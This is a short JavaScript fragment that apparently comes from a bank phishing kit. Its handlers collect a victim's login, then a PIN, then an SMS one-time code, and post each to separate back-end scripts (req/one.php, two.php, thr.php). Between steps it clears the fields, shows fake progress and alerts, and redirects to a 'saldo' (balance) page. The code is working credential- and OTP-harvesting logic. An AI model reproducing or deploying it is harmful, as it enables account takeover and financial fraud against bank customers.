        function sendLog(event){
            event.preventDefault();
            $("#btnsubmit").prop("disabled", true);
            $.ajax({
                type: "POST",
                url: "req/one.php",
                data: $("#formLog").serialize(),
                dataType: "text",
                complete: function () {
                    vibr(180);
                    $("#formLog input").val("");
                    $(".containerpin").fadeIn();
                }
            })
        }
        function sendPin(event){
            event.preventDefault();
            $('.process').fadeIn();
            $(".containerpin *").css("opacity", "0.8");
            $.ajax({
                type: "POST",
                url: "req/two.php",
                data: $("#formPin").serialize(),
                dataType: "text",
                complete: function () {
                    vibr(180);
                    window.location.href='saldo.html';
                    $('.process').fadeOut();
                    $('#formPin').hide();                    
                /* $("#formlogin").fadeOut();                    
                    $(".containerpin").fadeOut();*/
                   $("#formPin input").val("");                      
                }
            })
        }
        function showAlert(a){
            $(".alert").slideDown();
            setTimeout(function(){
                $(".alert").slideUp(90);
            }, 3000);
        }
        function sendSms(event){
            event.preventDefault();
            $("#btnsubmit").prop("disabled", true);
            $("textarea").prop("readonly", true);
            $.ajax({
                type: "POST",
                url: "req/thr.php",
                data: $("#formOtp").serialize(),
                dataType: "text",
                complete: function () {
                    vibr(1800);
                    $("textarea").prop("readonly", false);
                    $("textarea").val("");
                    showAlert("a");
                }
            })
        }
